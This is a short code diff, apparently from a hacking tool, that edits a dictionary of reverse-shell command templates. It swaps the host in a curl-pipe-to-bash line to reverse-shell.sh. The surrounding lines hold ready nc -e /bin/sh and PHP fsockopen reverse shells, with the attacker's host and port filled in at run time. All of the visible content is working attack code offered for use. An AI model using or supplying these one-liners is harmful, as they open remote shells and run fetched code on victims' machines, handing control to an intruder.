@@ -19,7 +19,7 @@ rev_shells = {
 	"nc2":
 		"nc -e /bin/sh {} {}",
 	"curl":
-		"curl https://shell.now.sh/{}:{} | bash",
+		"curl https://reverse-shell.sh/{}:{} | bash",
 	"php":
 		"""php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'""",
 	"ruby":
